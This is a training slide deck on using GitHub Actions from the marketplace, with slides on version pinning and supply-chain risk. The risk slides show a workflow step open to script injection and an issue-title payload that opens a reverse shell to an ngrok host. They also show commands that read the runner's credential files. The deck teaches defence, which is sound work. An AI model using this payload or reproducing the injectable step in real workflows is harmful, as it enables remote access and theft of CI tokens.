<!-- .slide: -->
# Marketplace
## 👉 [How to use](https://github.com/marketplace?type=actions)

![float-left w-800](./assets/images/githubsearch.png)

![float-right w-800](./assets/images/githubaction_marketplace_action.png)

Notes: 
Node ou Docker
Demo direct sur la marketplace

Gaetan

##==##
<!-- .slide: class="with-code" -->

# Use an GitHub Action from the marketplace

## Using versioned actions

```yaml
steps:
  # Reference a specific commit
  - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675
    
  # Reference the major version of a release
  - uses: actions/checkout@v3
    
  # Reference a specific version
  - uses: actions/checkout@v3.2.0
    
  # Reference a branch
  - uses: actions/checkout@main
```

<br> 
<br> 

## Using actions with parameters
```yaml
- name: Inject slug/short variables
  uses: rlespinasse/github-slug-action@v4
  with:
    short-length: 8
    prefix: CI_
```

Notes:

Gaetan

##==##
<!-- .slide: -->
# Usefuls actions

* 👉 [**actions/checkout**](https://github.com/marketplace/actions/checkout)

  * allow to checkout a repository 
  * github_token, ref, depth, path, ... customization

* 👉 [**actions/setup**](https://github.com/marketplace?type=actions&query=setup+)

  * allow to install a tool
  * provided by github and others
  * setup-java, setup-go, setup-node, setup-terraform, ....

* 👉 [**actions/dependency-review-action**](https://github.com/marketplace/actions/dependency-review)
  * scans pull requests for dependency changes and raise an error if vulnerabilities found.

Notes:

Gaetan

##==##
<!-- .slide: -->

# Risk

* Credential stealing
  * Opportunistic
  * Intentional
* Any maintainer can update a branch or a tag
* Runner credential stealing 

Notes:
Opportunistic - sensitive information is accidentally output to the log and an attacker finds it and uses it
Intentional - an attacker is able to insert a program into your workflow that steals credentials and sends them to the attacker
Use SHA-1 instead of version

Thibauld

##==##
<!-- .slide: class="with-code" -->
# Risk
## Example

* step of our Github Actions

```yaml
      - run: |
         echo "ISSUE TITLE: ${{github.event.issue.title}}"
         echo "ISSUE DESCRIPTION: ${{github.event.issue.body}}"
```

* Simple issue name that trigger our Action
```yaml
New malicious issue title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "
```

Notes:

ngrok to make a backdoor

Thibauld

##==##
<!-- .slide: class="with-code" -->
# Risk
## Example

* Credential 

```yaml
$ cat /home/runner/runners/2.287.1/.credentials
{"data":{"token":"REDACTED"},"scheme":"OAuthAccessToken"}
```

* Runner's data 

```yaml
$ cat /home/runner/runners/2.287.1/.runner
{
  "AgentId": "1",
  "AgentName": "Hosted Agent",
  "PoolId": "2",
  "ServerUrl": "https://pipelines.actions.githubusercontent.com/REDACTED/",
  "SkipSessionRecover": "True",
  "IsHostedServer": "True",
  "workFolder": "_work",
  "WorkFolder": "/home/runner/work",
  "MonitorSocketAddress": "127.0.0.1:49100"
}
```

Notes:

Thibauld
